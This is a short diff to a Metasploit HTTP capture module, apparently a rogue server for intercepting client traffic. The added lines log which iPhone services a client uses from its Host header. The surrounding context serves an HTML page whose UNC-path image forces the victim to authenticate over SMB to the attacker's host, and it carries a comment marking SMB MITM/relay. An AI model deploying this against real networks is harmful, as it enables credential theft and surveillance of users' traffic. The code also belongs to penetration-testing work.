@@ -127,6 +127,29 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 		
 		print_status("HTTP REQUEST #{cli.peerhost} > #{hhead}:#{@myport} #{req.method} #{req.resource}")
 		
+		
+		# The google maps / stocks view on the iPhone
+		if (req['Host'] == 'iphone-wu.apple.com')
+			case req.resource
+			when '/glm/mmap'
+				print_status("HTTP #{cli.peerhost} is using Google Maps on the iPhone")
+			when '/dgw'
+				print_status("HTTP #{cli.peerhost} is using Stocks/Weather on the iPhone")
+			else
+				print_status("HTTP #{cli.peerhost} is request #{req.resource} via the iPhone")
+			end
+		end
+		
+		# The itunes store on the iPhone
+		if(req['Host'] == 'phobos.apple.com') 
+			print_status("HTTP #{cli.peerhost} is using iTunes Store on the iPhone")
+			# GET /bag.xml
+		end
+		
+		
+		
+		# SMB MITM / RELAY
+		
 		data = "<html><head><title>Connecting...</title></head><body><img src='\\\\#{mysrc}\\public\\loading.jpg' width='1' height='1'></body></html>"
 		res  = 
 			"HTTP/1.1 200 OK\r\n" +
